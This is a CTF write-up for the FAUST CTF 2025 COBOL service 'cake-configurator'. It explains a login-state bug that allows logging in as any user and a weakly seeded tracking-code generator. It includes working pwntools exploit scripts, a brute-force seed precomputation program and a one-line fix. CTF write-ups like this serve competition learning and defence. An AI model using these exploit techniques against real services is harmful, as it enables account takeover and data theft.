---
title: "cake-configurator - FAUST CTF 2025"
category: "pwn"
subcategory: "prng"
type: "writeup"
tags: ["pwn", "cobol", "docker", "prng", "cake-configurator", "faust-ctf", "faust-ctf-2025", "2025", "ctf-writeup"]
summary: "cake-configurator is a COBOL-based TCP service that allows users to configure and order cakes and track their orders conveniently in the terminal."
source:
  name: "CTFtime writeup #40445"
  url: "https://ctftime.org/writeup/40445"
original_source: "https://saarsec.rocks/2025/10/02/FAUSTCTF-cake-configurator.html"
ctf:
  name: "FAUST CTF 2025"
  year: 2025
  challenge: "cake-configurator"
---

## Metadata

- **CTF:** FAUST CTF 2025
- **Task:** cake-configurator
- **Author team:** saarsec
- **CTFtime tags:** cobol, docker
- **CTFtime:** <https://ctftime.org/writeup/40445>
- **Original writeup:** <https://saarsec.rocks/2025/10/02/FAUSTCTF-cake-configurator.html>

---
## Overview

`cake-configurator` is a COBOL-based TCP service that allows users to configure and order cakes and track their orders conveniently in the terminal.  
Connecting via `socat` yields a comfy user interface that prompts us to either register or login.  
[![asciicast](<https://asciinema.org/a/npMdSrSejPBcR7rQ0XJUd4FdU.svg>)](<https://asciinema.org/a/npMdSrSejPBcR7rQ0XJUd4FdU>)

## First steps  
Do you know COBOL?  
No?  
Me neither!

![image](https://saarsec.rocks/assets/faust2025/cobol.jpg)

AI mostly sucks with solving entire challenges, but it's great at summarizing, so we decided to have a quick COBOL crash course with ChatGPT.  
Here are the key takeaways:  
* COBOL code is split into four divisions: `IDENTIFICATION`, `ENVIRONMENT`, `DATA`, and `PROCEDURE`. For our purposes, the most important ones are the `DATA` and `PROCEDURE` divisions, since that's where variables, parameters, and functions are defined.  
* The `DATA DIVISION` is again split into multiple sections. The key ones to know are:  
* `WORKING-STORAGE SECTION`: for static variables  
* `LINKAGE SECTION`: for parameters and return values  
* `SCREEN SECTION`: for data defining terminal user interfaces  
* The `PICTURE` (or `PIC`) clause defines the type and size of a memory portion. A `9` represents a numeric digit, so `PIC 9(5)` defines a numeric field that holds 5 digits.

While the syntax takes some time getting used to, the code is decently intuitive to read.

## The first vulnerability

### Logins are quite optimistic

One interesting thing we noticed early on is that the `WS-SUCCESS` variable in `LOGIN.cob` is initialized to `"F"` (for `false`), but the code only ever updates it to `"T"` (for `true`).  
It is never set back to false.  
Since this variable is used to determine whether a login was successful, once it's set to `"T"` after a successful login, all future login attempts will succeed, regardless of whether the password check actually passes.

```cobol  
PROCEDURE DIVISION USING LNK-UNAME LNK-MSG.  
PERFORM FOREVER  
DISPLAY LOGIN-SCREEN  
DISPLAY EOP-INDICATOR  
ACCEPT LOGIN-SCREEN  
EVALUATE WS-RESPONSE  
WHEN "C"  
PERFORM LOGIN-USER  
WHEN "M"  
GOBACK  
WHEN OTHER  
MOVE SPACES TO WS-RESPONSE  
MOVE "Invalid action" TO WS-MSG  
END-EVALUATE  
IF WS-SUCCESS = "T"  
THEN  
MOVE "login successful" TO LNK-MSG  
MOVE WS-UNAME TO LNK-UNAME  
GOBACK  
END-IF  
END-PERFORM.

LOGIN-USER.  
MOVE "pgsql://cake_db:5432/app" TO SQL-DS.  
EXEC SQL  
CONNECT TO :SQL-DS USER cake_user USING ilovecake  
END-EXEC.  
IF SQLCODE NOT = ZERO PERFORM SQL-ERROR EXIT PARAGRAPH.

PERFORM SQL-CHECK-USER.

EXEC SQL  
DISCONNECT  
END-EXEC.  
EXIT PARAGRAPH.

SQL-CHECK-USER.  
MOVE WS-UNAME TO SQL-UNAME.  
MOVE WS-PW TO SQL-PW.

EXEC SQL  
SELECT COUNT(*) INTO :SQL-CNT FROM USERS  
WHERE USERNAME = :SQL-UNAME AND PASSWORD = :SQL-PW  
END-EXEC.  
IF SQLCODE NOT = ZERO PERFORM SQL-ERROR EXIT PARAGRAPH.  
IF SQL-CNT = 0 MOVE "Invalid username or password" TO WS-MSG.  
IF SQL-CNT = 1 MOVE "T" TO WS-SUCCESS.  
EXIT PARAGRAPH.  
```  
As you can see in the code above, if `SQL-CNT = 0` (which happens when the username or password is incorrect), `WS-SUCCESS` is never reset to `"F"`.  
The variable is only initialized to `"F"` in the data division:

```cobol  
DATA DIVISION.  
WORKING-STORAGE SECTION.  
EXEC SQL INCLUDE SQLCA END-EXEC.  
01 WS-LOGIN.  
05 WS-SUCCESS PIC X(01) VALUE "F".  
05 WS-UNAME PIC X(32) VALUE SPACES.  
05 WS-PW PIC X(32) VALUE SPACES.  
05 WS-RESPONSE PIC X(01) VALUE "C".  
05 WS-MSG PIC X(32) VALUE "Please login".  
```

Therefore, after a first successful login, the variable stays true.

### Logged-in, logged-out? Who cares!

So, can we just log out after a successful login and log in as a different user?  
Unfortunately, no: there's no logout functionality, unless you quit the application.  
Restarting the app, however, does reset `WS-SUCCESS` back to `"F"`.  
And once you're logged in, you can't simply log in again as someone else, right?  
If you remember from the asciinema recording, there's no login option shown after you've already logged in.  
At first glance, it might seem that way because the login menu option disappears after you've logged in:

```cobol  
05 LOGGEDOUT-SECTION.  
10 VALUE "(L)OGIN - User Login" LINE 04 COL 02.  
```

However, the code that handles the login menu option doesn't check for that:  
```cobol  
PROCEDURE DIVISION.  
DISPLAY WELCOME-SCREEN  
DISPLAY EOP-INDICATOR  
ACCEPT WELCOME-SCREEN  
PERFORM UNTIL WS-MENU IS EQUAL TO "Q"  
EVALUATE WS-MENU  
WHEN "L"  
MOVE SPACES TO WS-MENU  
CALL "LOGIN" USING WS-UNAME WS-MSG  
IF WS-UNAME IS NOT EQUAL TO SPACES  
MOVE 1 TO WS-LOGGED-IN  
END-IF  
...  
```

Therefore, we can just log in again!  
And since the second login can't fail (`WS-SUCCESS` is `"T"`), we can actually log in as any user while logged in as someone else.

[![asciicast](<https://asciinema.org/a/4EcvBY4XI7SFdW4MtMp2prLLN.svg>)](<https://asciinema.org/a/4EcvBY4XI7SFdW4MtMp2prLLN>)

### The exploit

In short: register an account, log in with it, then log in again as a target user and view their cake orders - the flags are stored there.  
We get the usernames as flag IDs.  
So, the full exploit boils down to:

```python  
from pwn import *

# connect to the target team's service  
r = remote(f"fd66:666:{team_id}::2", 4321)

# choose a random username which we will register (so we can log into a known user)  
username = "user_" + str(random.randrange(999999999))

r.sendline(b"M") # some input is required to open the main menu  
r.sendline(b"R") # register a user  
r.sendline(username.encode()) # send the username, leave the password blank  
r.sendline(b"L") # log in  
r.sendline(username.encode()) # send the username, leave the password blank  
r.sendline(b"L") # now, log in again  
r.sendline(TARGET_USER.encode()) # we send the name of the target user, and leave the password blank (any password works)  
r.sendline(b"V") # finally, we can view the cake orders

# there might be multiple pages so we go to the (N)ext one a few times  
for i in range(10):  
r.sendline(b"N")  
r.sendline(b"M") # go back to the menu  
r.sendline(b"Q") # quit the application

printflags(r.recvall().decode()) # somewhere in the output there should be flags  
```

### Fixing the vulnerability

The bug is easy to fix: set `WS-SUCCESS` to `"F"` before each login attempt:

```diff  
PROCEDURE DIVISION USING LNK-UNAME LNK-MSG.  
PERFORM FOREVER  
DISPLAY LOGIN-SCREEN  
DISPLAY EOP-INDICATOR  
ACCEPT LOGIN-SCREEN  
\+ MOVE "F" TO WS-SUCCESS  
EVALUATE WS-RESPONSE  
WHEN "C"  
PERFORM LOGIN-USER  
WHEN "M"  
GOBACK  
WHEN OTHER  
MOVE SPACES TO WS-RESPONSE  
MOVE "Invalid action" TO WS-MSG  
END-EVALUATE  
IF WS-SUCCESS = "T"  
THEN  
MOVE "login successful" TO LNK-MSG  
MOVE WS-UNAME TO LNK-UNAME  
GOBACK  
END-IF  
END-PERFORM.  
```

It still leaves some edge cases (like trying to track orders while unauthenticated), but it closes this leak vector, so good enough :tm: for a CTF.

## The second vulnerability

### Not so random

Another interesting thing we discovered is how tracking codes are generated.  
These codes let anyone view cake orders, even if they didn't place the order themselves.  
Since the cake orders contain flags, knowing the tracking code means you can retrieve the flag.  
Hence, if tracking codes are predictable, flags aren't secure.  
Let's take a look what tracking orders are:

```cobol  
DATA DIVISION.  
WORKING-STORAGE SECTION.  
EXEC SQL INCLUDE SQLCA END-EXEC.  
01 WS-TRACKINGID.  
10 WS-UID PIC 9(05).  
10 WS-RAND PIC X(11).  
```

Essentially, the tracking codes have two parts: the user ID (which we're *mostly* given as flag IDs, more on that shortly) and a supposedly random value.  
Let's take a look at how `WS-RAND` is generated:

```cobol  
DATA DIVISION.  
WORKING-STORAGE SECTION.  
EXEC SQL INCLUDE SQLCA END-EXEC.  
01 WS-TRACKINGID.  
10 WS-UID PIC 9(05).  
10 WS-RAND PIC X(11).  
01 WS-TIME.  
10 WS-MICROSEC PIC 9(04).  
10 WS-SEC PIC 9(02).  
10 WS-MIN PIC 9(02).  
10 WS-HOUR PIC 9(02).  
01 WS-RNG.  
10 WS-NDX PIC S9(02) COMP.  
10 WS-RANDI PIC 9(02).  
10 WS-ALPH PIC X(36) VALUES  
"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".

...

PROCEDURE DIVISION USING LNK-TID LNK-UNAME LNK-MSG.  
PERFORM SQL-GETUID.

ACCEPT WS-TIME FROM TIME  
COMPUTE WS-RANDI = FUNCTION RANDOM(WS-MICROSEC)*26 + 1  
PERFORM VARYING WS-NDX FROM 1 BY 1 UNTIL WS-NDX>11  
COMPUTE WS-RANDI = Function RANDOM*36 + 1  
STRING WS-ALPH(WS-RANDI:1) INTO WS-CSB(WS-NDX)  
END-PERFORM.  
MOVE WS-STRARR TO WS-RAND.

MOVE WS-TRACKINGID TO LNK-TID  
GOBACK.  
...  
```

Essentially, the random number generator is seeded with `WS-MICROSEC` (`RANDOM(WS-MICROSEC)`), so the random value is deterministically derived from that seed.  
At first glance that looks okay:  
there are one million microseconds in a second, so even if you only knew the order time to the nearest second, you'd still have to brute-force a million possible seeds.  
That's not great, and not entirely infeasible.  
You might be able to recover a few flags over the course of the CTF, but it's far from reliable.

Additionally, the flag IDs we were given omit the last digit of the user ID.  
That increases the search space to about ten million values.  
You might get a flag this way, but only a couple.

### 1000us.  
But there's a major caveat:  
the *type* of `WS-MICROSEC` is declared as `PIC 9(04)`, which is a four-digit value.  
This means, there aren't one million but only ten thousand possible seeds.  
Including the missing final digit of the user ID, we can bring the search space down to 100,000 values.  
Not great, but enough to recover some flags.

### Pre-computing values  
I have no idea how the COBOL random number generator works internally, and I do not intent to find out.  
Instead, I just copied the code to generate all possible `WS-RAND` values:

```cobol  
IDENTIFICATION DIVISION.  
PROGRAM-ID. RANDOMGEN.

DATA DIVISION.  
WORKING-STORAGE SECTION.  
01 WS-SEED PIC 9(04).  
01 WS-RANDOM-FLOAT USAGE COMP-1.  
01 WS-RANDOM-INT PIC 9(04).  
01 WS-TRACKINGID.  
10 WS-UID PIC 9(05).  
10 WS-RAND PIC X(11).  
01 WS-TIME.  
10 WS-MICROSEC PIC 9(04).  
10 WS-SEC PIC 9(02).  
10 WS-MIN PIC 9(02).  
10 WS-HOUR PIC 9(02).  
01 WS-RNG.  
10 WS-NDX PIC S9(02) COMP.  
10 WS-RANDI PIC 9(02).  
10 WS-ALPH PIC X(36) VALUES  
"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".  
01 WS-STRARR.  
02 WS-ARR OCCURS 12 TIMES.  
05 WS-CSB PIC X(01).  
01 SQL-DS PIC X(64).  
01 SQL-UNAME PIC X(32) VALUE SPACES.

PROCEDURE DIVISION.  
DISPLAY "Enter a 4-digit seed (0000 - 9999):"  
ACCEPT WS-SEED  
COMPUTE WS-RANDI = FUNCTION RANDOM(WS-SEED)*26 + 1  
PERFORM VARYING WS-NDX FROM 1 BY 1 UNTIL WS-NDX>11  
COMPUTE WS-RANDI = Function RANDOM*36 + 1  
STRING WS-ALPH(WS-RANDI:1) INTO WS-CSB(WS-NDX)  
END-PERFORM.

MOVE WS-STRARR TO WS-RAND.  
DISPLAY WS-RAND.

STOP RUN.  
```

With that, we can pre-compute every possible value for `WS-RAND`.  
Then we just brute-force all combinations of those values and the missing digit from the user ID.

```python  
from pwn import *

# connect to the service for the target team  
r = remote(TEAM, 4321)

r.sendline(b"M") # open the menu  
i = 0

# iterate all possible values for the missing user id digit  
for k in range(10):  
# iterate all possible WS-RAND values  
for line in open("ws-rand.txt"):  
# every 500 values we scan for the flag and re-open the connection if not found  
if i % 500 == 0 and i:  
r.sendline("Q") # (Q)uit the application  
if printflags(r.recvall(timeout=15)): # check whether flag was found  
print("FOUND FLAG")  
quit()  
r = remote(TEAM, 4321) # reconnect  
r.sendline(b"T") # go to the (T)racking menu  
# enter guess for tracking id. If correct, the server will respond with something including the flag  
r.sendline((prefix + str(k) + line).encode())  
r.sendline(b"M") # go back to the (M)enu

# finally, close the connection and scan for the flag  
r.sendline(b"Q")  
if printflags(r.recvall()):  
print("FOUND FLAG")  
quit()  
```

After the competition was over, David from FAUST pointed out that the variable names are misleading.  
In the [official definition](<https://www.ibm.com/docs/en/cobol-zos/6.3.0?topic=functions-current-date>) of the struct, the variable order is different:  
```cobol  
WORKING-STORAGE SECTION.  
01 WS-CURRENT-DATE-FIELDS.  
05 WS-CURRENT-DATE.  
10 WS-CURRENT-YEAR PIC 9(4).  
10 WS-CURRENT-MONTH PIC 9(2).  
10 WS-CURRENT-DAY PIC 9(2).  
05 WS-CURRENT-TIME.  
10 WS-CURRENT-HOUR PIC 9(2).  
10 WS-CURRENT-MINUTE PIC 9(2).  
10 WS-CURRENT-SECOND PIC 9(2).  
10 WS-CURRENT-MS PIC 9(2).  
05 WS-DIFF-FROM-GMT PIC S9(4).  
PROCEDURE DIVISION.  
MOVE FUNCTION CURRENT-DATE TO WS-CURRENT-DATE-FIELDS  
```  
Instead of microseconds, we obtain hours and minutes in the field, making it trivial to brute-force.  
Assuming that the vulnboxes can be hosted in different countries, and that the [maximum time difference between two countries is 26](<https://en.wikipedia.org/wiki/Time_zone>), this brings the search space down to around 26 possible values.
